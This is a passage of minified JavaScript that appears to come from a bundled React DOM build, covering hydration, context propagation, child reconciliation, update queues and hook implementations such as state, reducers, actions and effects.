iy(n,i){dn[pn++]=lo,dn[pn++]=co,dn[pn++]=hi,lo=i.id,co=i.overflow,hi=n}var st=null,xa=null,aa=!1,gi=null,mn=!1,Bm=Error(o(519));function bi(n){var i=Error(o(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Hl(un(i,n)),Bm}function ry(n){var i=n.stateNode,s=n.type,u=n.memoizedProps;switch(i[Va]=n,i[tt]=u,s){case"dialog":Je("cancel",i),Je("close",i);break;case"iframe":case"object":case"embed":Je("load",i);break;case"video":case"audio":for(s=0;s<pc.length;s++)Je(pc[s],i);break;case"source":Je("error",i);break;case"img":case"image":case"link":Je("error",i),Je("load",i);break;case"details":Je("toggle",i);break;case"input":Je("invalid",i),Iu(i,u.value,u.defaultValue,u.checked,u.defaultChecked,u.type,u.name,!0);break;case"select":Je("invalid",i);break;case"textarea":Je("invalid",i),li(i,u.value,u.defaultValue,u.children)}s=u.children,typeof s!="string"&&typeof s!="number"&&typeof s!="bigint"||i.textContent===""+s||u.suppressHydrationWarning===!0||AS(i.textContent,s)?(u.popover!=null&&(Je("beforetoggle",i),Je("toggle",i)),u.onScroll!=null&&Je("scroll",i),u.onScrollEnd!=null&&Je("scrollend",i),u.onClick!=null&&(i.onclick=xn),i=!0):i=!1,i||bi(n,!0)}function sy(n){for(st=n.return;st;)switch(st.tag){case 5:case 31:case 13:mn=!1;return;case 27:case 3:mn=!0;return;default:st=st.return}}function Es(n){if(n!==st)return!1;if(!aa)return sy(n),aa=!0,!1;var i=n.tag,s;if((s=i!==3&&i!==27)&&((s=i===5)&&(s=n.type,s=!(s!=="form"&&s!=="button")||rh(n.type,n.memoizedProps)),s=!s),s&&xa&&bi(n),sy(n),i===13){if(n=n.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(o(317));xa=DS(n)}else if(i===31){if(n=n.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(o(317));xa=DS(n)}else i===27?(i=xa,Ii(n.type)?(n=dh,dh=null,xa=n):xa=i):xa=st?hn(n.stateNode.nextSibling):null;return!0}function xr(){xa=st=null,aa=!1}function Vm(){var n=gi;return n!==null&&(wt===null?wt=n:wt.push.apply(wt,n),gi=null),n}function Hl(n){gi===null?gi=[n]:gi.push(n)}var Fm=H(null),jr=null,Lo=null;function vi(n,i,s){M(Fm,i._currentValue),i._currentValue=s}function Io(n){n._currentValue=Fm.current,oe(Fm)}function Hm(n,i,s){for(;n!==null;){var u=n.alternate;if((n.childLanes&i)!==i?(n.childLanes|=i,u!==null&&(u.childLanes|=i)):u!==null&&(u.childLanes&i)!==i&&(u.childLanes|=i),n===s)break;n=n.return}}function Gm(n,i,s,u){var h=n.child;for(h!==null&&(h.return=n);h!==null;){var b=h.dependencies;if(b!==null){var C=h.child;b=b.firstContext;e:for(;b!==null;){var P=b;b=h;for(var V=0;V<i.length;V++)if(P.context===i[V]){b.lanes|=s,P=b.alternate,P!==null&&(P.lanes|=s),Hm(b.return,s,n),u||(C=null);break e}b=P.next}}else if(h.tag===18){if(C=h.return,C===null)throw Error(o(341));C.lanes|=s,b=C.alternate,b!==null&&(b.lanes|=s),Hm(C,s,n),C=null}else C=h.child;if(C!==null)C.return=h;else for(C=h;C!==null;){if(C===n){C=null;break}if(h=C.sibling,h!==null){h.return=C.return,C=h;break}C=C.return}h=C}}function Ss(n,i,s,u){n=null;for(var h=i,b=!1;h!==null;){if(!b){if((h.flags&524288)!==0)b=!0;else if((h.flags&262144)!==0)break}if(h.tag===10){var C=h.alternate;if(C===null)throw Error(o(387));if(C=C.memoizedProps,C!==null){var P=h.type;Ft(h.pendingProps.value,C.value)||(n!==null?n.push(P):n=[P])}}else if(h===Oe.current){if(C=h.alternate,C===null)throw Error(o(387));C.memoizedState.memoizedState!==h.memoizedState.memoizedState&&(n!==null?n.push(bc):n=[bc])}h=h.return}n!==null&&Gm(i,n,s,u),i.flags|=262144}function Zu(n){for(n=n.firstContext;n!==null;){if(!Ft(n.context._currentValue,n.memoizedValue))return!0;n=n.next}return!1}function Pr(n){jr=n,Lo=null,n=n.dependencies,n!==null&&(n.firstContext=null)}function lt(n){return ly(jr,n)}function ed(n,i){return jr===null&&Pr(n),ly(n,i)}function ly(n,i){var s=i._currentValue;if(i={context:i,memoizedValue:s,next:null},Lo===null){if(n===null)throw Error(o(308));Lo=i,n.dependencies={lanes:0,firstContext:i},n.flags|=524288}else Lo=Lo.next=i;return s}var PP=typeof AbortController<"u"?AbortController:function(){var n=[],i=this.signal={aborted:!1,addEventListener:function(s,u){n.push(u)}};this.abort=function(){i.aborted=!0,n.forEach(function(s){return s()})}},qP=a.unstable_scheduleCallback,RP=a.unstable_NormalPriority,Ga={$$typeof:B,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Jm(){return{controller:new PP,data:new Map,refCount:0}}function Gl(n){n.refCount--,n.refCount===0&&qP(RP,function(){n.controller.abort()})}var Jl=null,Qm=0,Cs=0,As=null;function LP(n,i){if(Jl===null){var s=Jl=[];Qm=0,Cs=Yf(),As={status:"pending",value:void 0,then:function(u){s.push(u)}}}return Qm++,i.then(cy,cy),i}function cy(){if(--Qm===0&&Jl!==null){As!==null&&(As.status="fulfilled");var n=Jl;Jl=null,Cs=0,As=null;for(var i=0;i<n.length;i++)(0,n[i])()}}function IP(n,i){var s=[],u={status:"pending",value:null,reason:null,then:function(h){s.push(h)}};return n.then(function(){u.status="fulfilled",u.value=i;for(var h=0;h<s.length;h++)(0,s[h])(i)},function(h){for(u.status="rejected",u.reason=h,h=0;h<s.length;h++)(0,s[h])(void 0)}),u}var uy=K.S;K.S=function(n,i){QE=Ua(),typeof i=="object"&&i!==null&&typeof i.then=="function"&&LP(n,i),uy!==null&&uy(n,i)};var qr=H(null);function Wm(){var n=qr.current;return n!==null?n:Sa.pooledCache}function ad(n,i){i===null?M(qr,qr.current):M(qr,i.pool)}function dy(){var n=Wm();return n===null?null:{parent:Ga._currentValue,pool:n}}var Ts=Error(o(460)),Km=Error(o(474)),td=Error(o(542)),nd={then:function(){}};function py(n){return n=n.status,n==="fulfilled"||n==="rejected"}function my(n,i,s){switch(s=n[s],s===void 0?n.push(i):s!==i&&(i.then(xn,xn),i=s),i.status){case"fulfilled":return i.value;case"rejected":throw n=i.reason,hy(n),n;default:if(typeof i.status=="string")i.then(xn,xn);else{if(n=Sa,n!==null&&100<n.shellSuspendCounter)throw Error(o(482));n=i,n.status="pending",n.then(function(u){if(i.status==="pending"){var h=i;h.status="fulfilled",h.value=u}},function(u){if(i.status==="pending"){var h=i;h.status="rejected",h.reason=u}})}switch(i.status){case"fulfilled":return i.value;case"rejected":throw n=i.reason,hy(n),n}throw Lr=i,Ts}}function Rr(n){try{var i=n._init;return i(n._payload)}catch(s){throw s!==null&&typeof s=="object"&&typeof s.then=="function"?(Lr=s,Ts):s}}var Lr=null;function fy(){if(Lr===null)throw Error(o(459));var n=Lr;return Lr=null,n}function hy(n){if(n===Ts||n===td)throw Error(o(483))}var xs=null,Ql=0;function od(n){var i=Ql;return Ql+=1,xs===null&&(xs=[]),my(xs,n,i)}function Wl(n,i){i=i.props.ref,n.ref=i!==void 0?i:null}function id(n,i){throw i.$$typeof===S?Error(o(525)):(n=Object.prototype.toString.call(i),Error(o(31,n==="[object Object]"?"object with keys {"+Object.keys(i).join(", ")+"}":n)))}function gy(n){function i(W,J){if(n){var Y=W.deletions;Y===null?(W.deletions=[J],W.flags|=16):Y.push(J)}}function s(W,J){if(!n)return null;for(;J!==null;)i(W,J),J=J.sibling;return null}function u(W){for(var J=new Map;W!==null;)W.key!==null?J.set(W.key,W):J.set(W.index,W),W=W.sibling;return J}function h(W,J){return W=qo(W,J),W.index=0,W.sibling=null,W}function b(W,J,Y){return W.index=Y,n?(Y=W.alternate,Y!==null?(Y=Y.index,Y<J?(W.flags|=67108866,J):Y):(W.flags|=67108866,J)):(W.flags|=1048576,J)}function C(W){return n&&W.alternate===null&&(W.flags|=67108866),W}function P(W,J,Y,re){return J===null||J.tag!==6?(J=Nm(Y,W.mode,re),J.return=W,J):(J=h(J,Y),J.return=W,J)}function V(W,J,Y,re){var qe=Y.type;return qe===L?ie(W,J,Y.props.children,re,Y.key):J!==null&&(J.elementType===qe||typeof qe=="object"&&qe!==null&&qe.$$typeof===I&&Rr(qe)===J.type)?(J=h(J,Y.props),Wl(J,Y),J.return=W,J):(J=Yu(Y.type,Y.key,Y.props,null,W.mode,re),Wl(J,Y),J.return=W,J)}function X(W,J,Y,re){return J===null||J.tag!==4||J.stateNode.containerInfo!==Y.containerInfo||J.stateNode.implementation!==Y.implementation?(J=Om(Y,W.mode,re),J.return=W,J):(J=h(J,Y.children||[]),J.return=W,J)}function ie(W,J,Y,re,qe){return J===null||J.tag!==7?(J=Tr(Y,W.mode,re,qe),J.return=W,J):(J=h(J,Y),J.return=W,J)}function se(W,J,Y){if(typeof J=="string"&&J!==""||typeof J=="number"||typeof J=="bigint")return J=Nm(""+J,W.mode,Y),J.return=W,J;if(typeof J=="object"&&J!==null){switch(J.$$typeof){case A:return Y=Yu(J.type,J.key,J.props,null,W.mode,Y),Wl(Y,J),Y.return=W,Y;case R:return J=Om(J,W.mode,Y),J.return=W,J;case I:return J=Rr(J),se(W,J,Y)}if(me(J)||z(J))return J=Tr(J,W.mode,Y,null),J.return=W,J;if(typeof J.then=="function")return se(W,od(J),Y);if(J.$$typeof===B)return se(W,ed(W,J),Y);id(W,J)}return null}function ae(W,J,Y,re){var qe=J!==null?J.key:null;if(typeof Y=="string"&&Y!==""||typeof Y=="number"||typeof Y=="bigint")return qe!==null?null:P(W,J,""+Y,re);if(typeof Y=="object"&&Y!==null){switch(Y.$$typeof){case A:return Y.key===qe?V(W,J,Y,re):null;case R:return Y.key===qe?X(W,J,Y,re):null;case I:return Y=Rr(Y),ae(W,J,Y,re)}if(me(Y)||z(Y))return qe!==null?null:ie(W,J,Y,re,null);if(typeof Y.then=="function")return ae(W,J,od(Y),re);if(Y.$$typeof===B)return ae(W,J,ed(W,Y),re);id(W,Y)}return null}function ne(W,J,Y,re,qe){if(typeof re=="string"&&re!==""||typeof re=="number"||typeof re=="bigint")return W=W.get(Y)||null,P(J,W,""+re,qe);if(typeof re=="object"&&re!==null){switch(re.$$typeof){case A:return W=W.get(re.key===null?Y:re.key)||null,V(J,W,re,qe);case R:return W=W.get(re.key===null?Y:re.key)||null,X(J,W,re,qe);case I:return re=Rr(re),ne(W,J,Y,re,qe)}if(me(re)||z(re))return W=W.get(Y)||null,ie(J,W,re,qe,null);if(typeof re.then=="function")return ne(W,J,Y,od(re),qe);if(re.$$typeof===B)return ne(W,J,Y,ed(J,re),qe);id(J,re)}return null}function Ce(W,J,Y,re){for(var qe=null,la=null,Te=J,Be=J=0,Ke=null;Te!==null&&Be<Y.length;Be++){Te.index>Be?(Ke=Te,Te=null):Ke=Te.sibling;var ca=ae(W,Te,Y[Be],re);if(ca===null){Te===null&&(Te=Ke);break}n&&Te&&ca.alternate===null&&i(W,Te),J=b(ca,J,Be),la===null?qe=ca:la.sibling=ca,la=ca,Te=Ke}if(Be===Y.length)return s(W,Te),aa&&Ro(W,Be),qe;if(Te===null){for(;Be<Y.length;Be++)Te=se(W,Y[Be],re),Te!==null&&(J=b(Te,J,Be),la===null?qe=Te:la.sibling=Te,la=Te);return aa&&Ro(W,Be),qe}for(Te=u(Te);Be<Y.length;Be++)Ke=ne(Te,W,Be,Y[Be],re),Ke!==null&&(n&&Ke.alternate!==null&&Te.delete(Ke.key===null?Be:Ke.key),J=b(Ke,J,Be),la===null?qe=Ke:la.sibling=Ke,la=Ke);return n&&Te.forEach(function(ki){return i(W,ki)}),aa&&Ro(W,Be),qe}function Ie(W,J,Y,re){if(Y==null)throw Error(o(151));for(var qe=null,la=null,Te=J,Be=J=0,Ke=null,ca=Y.next();Te!==null&&!ca.done;Be++,ca=Y.next()){Te.index>Be?(Ke=Te,Te=null):Ke=Te.sibling;var ki=ae(W,Te,ca.value,re);if(ki===null){Te===null&&(Te=Ke);break}n&&Te&&ki.alternate===null&&i(W,Te),J=b(ki,J,Be),la===null?qe=ki:la.sibling=ki,la=ki,Te=Ke}if(ca.done)return s(W,Te),aa&&Ro(W,Be),qe;if(Te===null){for(;!ca.done;Be++,ca=Y.next())ca=se(W,ca.value,re),ca!==null&&(J=b(ca,J,Be),la===null?qe=ca:la.sibling=ca,la=ca);return aa&&Ro(W,Be),qe}for(Te=u(Te);!ca.done;Be++,ca=Y.next())ca=ne(Te,W,Be,ca.value,re),ca!==null&&(n&&ca.alternate!==null&&Te.delete(ca.key===null?Be:ca.key),J=b(ca,J,Be),la===null?qe=ca:la.sibling=ca,la=ca);return n&&Te.forEach(function(Vq){return i(W,Vq)}),aa&&Ro(W,Be),qe}function Ea(W,J,Y,re){if(typeof Y=="object"&&Y!==null&&Y.type===L&&Y.key===null&&(Y=Y.props.children),typeof Y=="object"&&Y!==null){switch(Y.$$typeof){case A:e:{for(var qe=Y.key;J!==null;){if(J.key===qe){if(qe=Y.type,qe===L){if(J.tag===7){s(W,J.sibling),re=h(J,Y.props.children),re.return=W,W=re;break e}}else if(J.elementType===qe||typeof qe=="object"&&qe!==null&&qe.$$typeof===I&&Rr(qe)===J.type){s(W,J.sibling),re=h(J,Y.props),Wl(re,Y),re.return=W,W=re;break e}s(W,J);break}else i(W,J);J=J.sibling}Y.type===L?(re=Tr(Y.props.children,W.mode,re,Y.key),re.return=W,W=re):(re=Yu(Y.type,Y.key,Y.props,null,W.mode,re),Wl(re,Y),re.return=W,W=re)}return C(W);case R:e:{for(qe=Y.key;J!==null;){if(J.key===qe)if(J.tag===4&&J.stateNode.containerInfo===Y.containerInfo&&J.stateNode.implementation===Y.implementation){s(W,J.sibling),re=h(J,Y.children||[]),re.return=W,W=re;break e}else{s(W,J);break}else i(W,J);J=J.sibling}re=Om(Y,W.mode,re),re.return=W,W=re}return C(W);case I:return Y=Rr(Y),Ea(W,J,Y,re)}if(me(Y))return Ce(W,J,Y,re);if(z(Y)){if(qe=z(Y),typeof qe!="function")throw Error(o(150));return Y=qe.call(Y),Ie(W,J,Y,re)}if(typeof Y.then=="function")return Ea(W,J,od(Y),re);if(Y.$$typeof===B)return Ea(W,J,ed(W,Y),re);id(W,Y)}return typeof Y=="string"&&Y!==""||typeof Y=="number"||typeof Y=="bigint"?(Y=""+Y,J!==null&&J.tag===6?(s(W,J.sibling),re=h(J,Y),re.return=W,W=re):(s(W,J),re=Nm(Y,W.mode,re),re.return=W,W=re),C(W)):s(W,J)}return function(W,J,Y,re){try{Ql=0;var qe=Ea(W,J,Y,re);return xs=null,qe}catch(Te){if(Te===Ts||Te===td)throw Te;var la=Ht(29,Te,null,W.mode);return la.lanes=re,la.return=W,la}}}var Ir=gy(!0),by=gy(!1),yi=!1;function $m(n){n.updateQueue={baseState:n.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Ym(n,i){n=n.updateQueue,i.updateQueue===n&&(i.updateQueue={baseState:n.baseState,firstBaseUpdate:n.firstBaseUpdate,lastBaseUpdate:n.lastBaseUpdate,shared:n.shared,callbacks:null})}function Ei(n){return{lane:n,tag:0,payload:null,callback:null,next:null}}function Si(n,i,s){var u=n.updateQueue;if(u===null)return null;if(u=u.shared,(da&2)!==0){var h=u.pending;return h===null?i.next=i:(i.next=h.next,h.next=i),u.pending=i,i=$u(n),ey(n,null,s),i}return Ku(n,u,i,s),$u(n)}function Kl(n,i,s){if(i=i.updateQueue,i!==null&&(i=i.shared,(s&4194048)!==0)){var u=i.lanes;u&=n.pendingLanes,s|=u,i.lanes=s,Cl(n,s)}}function Xm(n,i){var s=n.updateQueue,u=n.alternate;if(u!==null&&(u=u.updateQueue,s===u)){var h=null,b=null;if(s=s.firstBaseUpdate,s!==null){do{var C={lane:s.lane,tag:s.tag,payload:s.payload,callback:null,next:null};b===null?h=b=C:b=b.next=C,s=s.next}while(s!==null);b===null?h=b=i:b=b.next=i}else h=b=i;s={baseState:u.baseState,firstBaseUpdate:h,lastBaseUpdate:b,shared:u.shared,callbacks:u.callbacks},n.updateQueue=s;return}n=s.lastBaseUpdate,n===null?s.firstBaseUpdate=i:n.next=i,s.lastBaseUpdate=i}var Zm=!1;function $l(){if(Zm){var n=As;if(n!==null)throw n}}function Yl(n,i,s,u){Zm=!1;var h=n.updateQueue;yi=!1;var b=h.firstBaseUpdate,C=h.lastBaseUpdate,P=h.shared.pending;if(P!==null){h.shared.pending=null;var V=P,X=V.next;V.next=null,C===null?b=X:C.next=X,C=V;var ie=n.alternate;ie!==null&&(ie=ie.updateQueue,P=ie.lastBaseUpdate,P!==C&&(P===null?ie.firstBaseUpdate=X:P.next=X,ie.lastBaseUpdate=V))}if(b!==null){var se=h.baseState;C=0,ie=X=V=null,P=b;do{var ae=P.lane&-536870913,ne=ae!==P.lane;if(ne?(We&ae)===ae:(u&ae)===ae){ae!==0&&ae===Cs&&(Zm=!0),ie!==null&&(ie=ie.next={lane:0,tag:P.tag,payload:P.payload,callback:null,next:null});e:{var Ce=n,Ie=P;ae=i;var Ea=s;switch(Ie.tag){case 1:if(Ce=Ie.payload,typeof Ce=="function"){se=Ce.call(Ea,se,ae);break e}se=Ce;break e;case 3:Ce.flags=Ce.flags&-65537|128;case 0:if(Ce=Ie.payload,ae=typeof Ce=="function"?Ce.call(Ea,se,ae):Ce,ae==null)break e;se=y({},se,ae);break e;case 2:yi=!0}}ae=P.callback,ae!==null&&(n.flags|=64,ne&&(n.flags|=8192),ne=h.callbacks,ne===null?h.callbacks=[ae]:ne.push(ae))}else ne={lane:ae,tag:P.tag,payload:P.payload,callback:P.callback,next:null},ie===null?(X=ie=ne,V=se):ie=ie.next=ne,C|=ae;if(P=P.next,P===null){if(P=h.shared.pending,P===null)break;ne=P,P=ne.next,ne.next=null,h.lastBaseUpdate=ne,h.shared.pending=null}}while(!0);ie===null&&(V=se),h.baseState=V,h.firstBaseUpdate=X,h.lastBaseUpdate=ie,b===null&&(h.shared.lanes=0),ji|=C,n.lanes=C,n.memoizedState=se}}function vy(n,i){if(typeof n!="function")throw Error(o(191,n));n.call(i)}function yy(n,i){var s=n.callbacks;if(s!==null)for(n.callbacks=null,n=0;n<s.length;n++)vy(s[n],i)}var js=H(null),rd=H(0);function Ey(n,i){n=Uo,M(rd,n),M(js,i),Uo=n|i.baseLanes}function ef(){M(rd,Uo),M(js,js.current)}function af(){Uo=rd.current,oe(js),oe(rd)}var Gt=H(null),fn=null;function Ci(n){var i=n.alternate;M(Na,Na.current&1),M(Gt,n),fn===null&&(i===null||js.current!==null||i.memoizedState!==null)&&(fn=n)}function tf(n){M(Na,Na.current),M(Gt,n),fn===null&&(fn=n)}function Sy(n){n.tag===22?(M(Na,Na.current),M(Gt,n),fn===null&&(fn=n)):Ai()}function Ai(){M(Na,Na.current),M(Gt,Gt.current)}function Jt(n){oe(Gt),fn===n&&(fn=null),oe(Na)}var Na=H(0);function sd(n){for(var i=n;i!==null;){if(i.tag===13){var s=i.memoizedState;if(s!==null&&(s=s.dehydrated,s===null||ch(s)||uh(s)))return i}else if(i.tag===19&&(i.memoizedProps.revealOrder==="forwards"||i.memoizedProps.revealOrder==="backwards"||i.memoizedProps.revealOrder==="unstable_legacy-backwards"||i.memoizedProps.revealOrder==="together")){if((i.flags&128)!==0)return i}else if(i.child!==null){i.child.return=i,i=i.child;continue}if(i===n)break;for(;i.sibling===null;){if(i.return===null||i.return===n)return null;i=i.return}i.sibling.return=i.return,i=i.sibling}return null}var Do=0,Ue=null,va=null,Ja=null,ld=!1,Ps=!1,Dr=!1,cd=0,Xl=0,qs=null,DP=0;function Ma(){throw Error(o(321))}function nf(n,i){if(i===null)return!1;for(var s=0;s<i.length&&s<n.length;s++)if(!Ft(n[s],i[s]))return!1;return!0}function of(n,i,s,u,h,b){return Do=b,Ue=i,i.memoizedState=null,i.updateQueue=null,i.lanes=0,K.H=n===null||n.memoizedState===null?oE:Ef,Dr=!1,b=s(u,h),Dr=!1,Ps&&(b=Ay(i,s,u,h)),Cy(n),b}function Cy(n){K.H=ac;var i=va!==null&&va.next!==null;if(Do=0,Ja=va=Ue=null,ld=!1,Xl=0,qs=null,i)throw Error(o(300));n===null||Qa||(n=n.dependencies,n!==null&&Zu(n)&&(Qa=!0))}function Ay(n,i,s,u){Ue=n;var h=0;do{if(Ps&&(qs=null),Xl=0,Ps=!1,25<=h)throw Error(o(301));if(h+=1,Ja=va=null,n.updateQueue!=null){var b=n.updateQueue;b.lastEffect=null,b.events=null,b.stores=null,b.memoCache!=null&&(b.memoCache.index=0)}K.H=iE,b=i(s,u)}while(Ps);return b}function wP(){var n=K.H,i=n.useState()[0];return i=typeof i.then=="function"?Zl(i):i,n=n.useState()[0],(va!==null?va.memoizedState:null)!==n&&(Ue.flags|=1024),i}function rf(){var n=cd!==0;return cd=0,n}function sf(n,i,s){i.updateQueue=n.updateQueue,i.flags&=-2053,n.lanes&=~s}function lf(n){if(ld){for(n=n.memoizedState;n!==null;){var i=n.queue;i!==null&&(i.pending=null),n=n.next}ld=!1}Do=0,Ja=va=Ue=null,Ps=!1,Xl=cd=0,qs=null}function xt(){var n={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ja===null?Ue.memoizedState=Ja=n:Ja=Ja.next=n,Ja}function Oa(){if(va===null){var n=Ue.alternate;n=n!==null?n.memoizedState:null}else n=va.next;var i=Ja===null?Ue.memoizedState:Ja.next;if(i!==null)Ja=i,va=n;else{if(n===null)throw Ue.alternate===null?Error(o(467)):Error(o(310));va=n,n={memoizedState:va.memoizedState,baseState:va.baseState,baseQueue:va.baseQueue,queue:va.queue,next:null},Ja===null?Ue.memoizedState=Ja=n:Ja=Ja.next=n}return Ja}function ud(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Zl(n){var i=Xl;return Xl+=1,qs===null&&(qs=[]),n=my(qs,n,i),i=Ue,(Ja===null?i.memoizedState:Ja.next)===null&&(i=i.alternate,K.H=i===null||i.memoizedState===null?oE:Ef),n}function dd(n){if(n!==null&&typeof n=="object"){if(typeof n.then=="function")return Zl(n);if(n.$$typeof===B)return lt(n)}throw Error(o(438,String(n)))}function cf(n){var i=null,s=Ue.updateQueue;if(s!==null&&(i=s.memoCache),i==null){var u=Ue.alternate;u!==null&&(u=u.updateQueue,u!==null&&(u=u.memoCache,u!=null&&(i={data:u.data.map(function(h){return h.slice()}),index:0})))}if(i==null&&(i={data:[],index:0}),s===null&&(s=ud(),Ue.updateQueue=s),s.memoCache=i,s=i.data[i.index],s===void 0)for(s=i.data[i.index]=Array(n),u=0;u<n;u++)s[u]=j;return i.index++,s}function wo(n,i){return typeof i=="function"?i(n):i}function pd(n){var i=Oa();return uf(i,va,n)}function uf(n,i,s){var u=n.queue;if(u===null)throw Error(o(311));u.lastRenderedReducer=s;var h=n.baseQueue,b=u.pending;if(b!==null){if(h!==null){var C=h.next;h.next=b.next,b.next=C}i.baseQueue=h=b,u.pending=null}if(b=n.baseState,h===null)n.memoizedState=b;else{i=h.next;var P=C=null,V=null,X=i,ie=!1;do{var se=X.lane&-536870913;if(se!==X.lane?(We&se)===se:(Do&se)===se){var ae=X.revertLane;if(ae===0)V!==null&&(V=V.next={lane:0,revertLane:0,gesture:null,action:X.action,hasEagerState:X.hasEagerState,eagerState:X.eagerState,next:null}),se===Cs&&(ie=!0);else if((Do&ae)===ae){X=X.next,ae===Cs&&(ie=!0);continue}else se={lane:0,revertLane:X.revertLane,gesture:null,action:X.action,hasEagerState:X.hasEagerState,eagerState:X.eagerState,next:null},V===null?(P=V=se,C=b):V=V.next=se,Ue.lanes|=ae,ji|=ae;se=X.action,Dr&&s(b,se),b=X.hasEagerState?X.eagerState:s(b,se)}else ae={lane:se,revertLane:X.revertLane,gesture:X.gesture,action:X.action,hasEagerState:X.hasEagerState,eagerState:X.eagerState,next:null},V===null?(P=V=ae,C=b):V=V.next=ae,Ue.lanes|=se,ji|=se;X=X.next}while(X!==null&&X!==i);if(V===null?C=b:V.next=P,!Ft(b,n.memoizedState)&&(Qa=!0,ie&&(s=As,s!==null)))throw s;n.memoizedState=b,n.baseState=C,n.baseQueue=V,u.lastRenderedState=b}return h===null&&(u.lanes=0),[n.memoizedState,u.dispatch]}function df(n){var i=Oa(),s=i.queue;if(s===null)throw Error(o(311));s.lastRenderedReducer=n;var u=s.dispatch,h=s.pending,b=i.memoizedState;if(h!==null){s.pending=null;var C=h=h.next;do b=n(b,C.action),C=C.next;while(C!==h);Ft(b,i.memoizedState)||(Qa=!0),i.memoizedState=b,i.baseQueue===null&&(i.baseState=b),s.lastRenderedState=b}return[b,u]}function Ty(n,i,s){var u=Ue,h=Oa(),b=aa;if(b){if(s===void 0)throw Error(o(407));s=s()}else s=i();var C=!Ft((va||h).memoizedState,s);if(C&&(h.memoizedState=s,Qa=!0),h=h.queue,ff(Py.bind(null,u,h,n),[n]),h.getSnapshot!==i||C||Ja!==null&&Ja.memoizedState.tag&1){if(u.flags|=2048,Rs(9,{destroy:void 0},jy.bind(null,u,h,s,i),null),Sa===null)throw Error(o(349));b||(Do&127)!==0||xy(u,i,s)}return s}function xy(n,i,s){n.flags|=16384,n={getSnapshot:i,value:s},i=Ue.updateQueue,i===null?(i=ud(),Ue.updateQueue=i,i.stores=[n]):(s=i.stores,s===null?i.stores=[n]:s.push(n))}function jy(n,i,s,u){i.value=s,i.getSnapshot=u,qy(i)&&Ry(n)}function Py(n,i,s){return s(function(){qy(i)&&Ry(n)})}function qy(n){var i=n.getSnapshot;n=n.value;try{var s=i();return!Ft(n,s)}catch{return!0}}function Ry(n){var i=Ar(n,2);i!==null&&Mt(i,n,2)}function pf(n){var i=xt();if(typeof n=="function"){var s=n;if(n=s(),Dr){qa(!0);try{s()}finally{qa(!1)}}}return i.memoizedState=i.baseState=n,i.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:wo,lastRenderedState:n},i}function Ly(n,i,s,u){return n.baseState=s,uf(n,va,typeof u=="function"?u:wo)}function MP(n,i,s,u,h){if(hd(n))throw Error(o(485));if(n=i.action,n!==null){var b={payload:h,action:n,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(C){b.listeners.push(C)}};K.T!==null?s(!0):b.isTransition=!1,u(b),s=i.pending,s===null?(b.next=i.pending=b,Iy(i,b)):(b.next=s.next,i.pending=s.next=b)}}function Iy(n,i){var s=i.action,u=i.payload,h=n.state;if(i.isTransition){var b=K.T,C={};K.T=C;try{var P=s(h,u),V=K.S;V!==null&&V(C,P),Dy(n,i,P)}catch(X){mf(n,i,X)}finally{b!==null&&C.types!==null&&(b.types=C.types),K.T=b}}else try{b=s(h,u),Dy(n,i,b)}catch(X){mf(n,i,X)}}function Dy(n,i,s){s!==null&&typeof s=="object"&&typeof s.then=="function"?s.then(function(u){wy(n,i,u)},function(u){return mf(n,i,u)}):wy(n,i,s)}function wy(n,i,s){i.status="fulfilled",i.value=s,My(i),n.state=s,i=n.pending,i!==null&&(s=i.next,s===i?n.pending=null:(s=s.next,i.next=s,Iy(n,s)))}function mf(n,i,s){var u=n.pending;if(n.pending=null,u!==null){u=u.next;do i.status="rejected",i.reason=s,My(i),i=i.next;while(i!==u)}n.action=null}function My(n){n=n.listeners;for(var i=0;i<n.length;i++)(0,n[i])()}function _y(n,i){return i}function ky(n,i){if(aa){var s=Sa.formState;if(s!==null){e:{var u=Ue;if(aa){if(xa){a:{for(var h=xa,b=mn;h.nodeType!==8;){if(!b){h=null;break a}if(h=hn(h.nextSibling),h===null){h=null;break a}}b=h.data,h=b==="F!"||b==="F"?h:null}if(h){xa=hn(h.nextSibling),u=h.data==="F!";break e}}bi(u)}u=!1}u&&(i=s[0])}}return s=xt(),s.memoizedState=s.baseState=i,u={pending:null,lanes:0,dispatch:null,lastRenderedReducer:_y,lastRenderedState:i},s.queue=u,s=aE.bind(null,Ue,u),u.dispatch=s,u=pf(!1),b=yf.bind(null,Ue,!1,u.queue),u=xt(),h={state:i,dispatch:null,action:n,pending:null},u.queue=h,s=MP.bind(null,Ue,h,b,s),h.dispatch=s,u.memoizedState=n,[i,s,!1]}function Ny(n){var i=Oa();return Oy(i,va,n)}function Oy(n,i,s){if(i=uf(n,i,_y)[0],n=pd(wo)[0],typeof i=="object"&&i!==null&&typeof i.then=="function")try{var u=Zl(i)}catch(C){throw C===Ts?td:C}else u=i;i=Oa();var h=i.queue,b=h.dispatch;return s!==i.memoizedState&&(Ue.flags|=2048,Rs(9,{destroy:void 0},_P.bind(null,h,s),null)),[u,b,n]}function _P(n,i){n.action=i}function zy(n){var i=Oa(),s=va;if(s!==null)return Oy(i,s,n);Oa(),i=i.memoizedState,s=Oa();var u=s.queue.dispatch;return s.memoizedState=n,[i,u,!1]}function Rs(n,i,s,u){return n={tag:n,create:s,deps:u,inst:i,next:null},i=Ue.updateQueue,i===null&&(i=ud(),Ue.updateQueue=i),s=i.lastEffect,s===null?i.lastEffect=n.next=n:(u=s.next,s.next=n,n.next=u,i.lastEffect=n),n}function Uy(){return Oa().memoizedState}function md(n,i,s,u){var h=xt();Ue.flags|=n,h.memoizedState=Rs(1|i,{destroy:void 0},s,u===void 0?null:u)}function fd(n,i,s,u){var h=Oa();u=u===void 0?null:u;var b=h.memoizedState.inst;va!==null&&u!==null&&nf(u,va.memoizedState.deps)?h.memoizedState=Rs(i,b,s,u):(Ue.flags|=n,h.memoizedState=Rs(1|i,b,s,u))}function By(n,i){md(8390656,8,n,i)}function ff(n,i){fd(2048,8,n,i)}function kP(n){Ue.flags|=4;var i=Ue.updateQueue;if(i===null)i=ud(),Ue.updateQueue=i,i.events=[n];else{var 